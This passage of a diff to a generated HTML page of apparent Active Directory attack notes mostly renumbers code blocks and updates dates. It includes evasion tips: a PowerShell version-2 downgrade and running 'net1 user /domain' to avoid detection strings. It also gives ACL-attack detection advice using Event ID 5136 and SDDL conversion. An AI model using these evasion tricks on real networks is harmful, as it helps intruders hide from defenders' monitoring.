-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-92-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1"></a><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-version</span> <span class="n">2</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-93-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1"></a><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-version</span> <span class="n">2</span>
 </span></code></pre></div></td></tr></table></div>
 <p>PowerShell Operational Logs are kept under under <code>Applications and Services Logs &gt; Microsoft &gt; Windows &gt; PowerShell &gt; Operational</code>.
 Also the <code>Windows PowerShell</code> log is located at <code>Applications and Services Logs &gt; Windows PowerShell</code>.</p>
 <h4 id="net-commands-trick">Net Commands Trick</h4>
 <p>Typing <code>net1</code> instead of <code>net</code> will execute the same functions without the potential trigger from the net string. Example:</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-93-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1"></a><span class="n">net1</span> <span class="n">user</span> <span class="p">/</span><span class="n">domain</span>   
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-94-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1"></a><span class="n">net1</span> <span class="n">user</span> <span class="p">/</span><span class="n">domain</span>   
 </span></code></pre></div></td></tr></table></div>
 <h2 id="mitigations_1">Mitigations</h2>
 <ol>
@@ -19065,14 +19120,14 @@ Also the <code>Windows PowerShell</code> log is located at <code>Applications 
 </ol>
 <p>Enabling the <a href="https://docs.microsoft.com/en-us/archive/blogs/canitpro/step-by-step-enabling-advanced-security-audit-policy-via-ds-access">Advanced Security Audit Policy</a> can help in detecting unwanted changes, especially <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5136">Event ID 5136: A directory service object was modified</a> which would indicate that the domain object was modified, which could be indicative of an ACL attack. If we look at the event log after modifying the ACL of the domain object, we will see some event ID <code>5136</code> created. If we check out the <code>Details</code> tab, we can see that the pertinent information is written in <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language">Security Descriptor Definition Language (SDDL)</a> which is not human readable.</p>
 <p>We can use the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/convertfrom-sddlstring?view=powershell-7.2">ConvertFrom-SddlString cmdlet</a> to convert this to a readable format.</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-94-1">1</a></span>
-<span class="normal"><a href="#__codelineno-94-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1"></a><span class="c"># Converting the SDDL String into a Readable Format</span>
-</span><span id="__span-94-2"><a id="__codelineno-94-2" name="__codelineno-94-2"></a><span class="nb">ConvertFrom-SddlString</span> <span class="s2">&quot;O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-[CUT]&quot;</span> 
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-95-1">1</a></span>
+<span class="normal"><a href="#__codelineno-95-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1"></a><span class="c"># Converting the SDDL String into a Readable Format</span>
+</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2"></a><span class="nb">ConvertFrom-SddlString</span> <span class="s2">&quot;O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-[CUT]&quot;</span> 
 </span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-01-08T21:45:55+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-01-08</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-01-13T04:23:33+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-01-13</span></small></br>
 
 
     <small>Created: December 27, 2024 22:00:41</small>
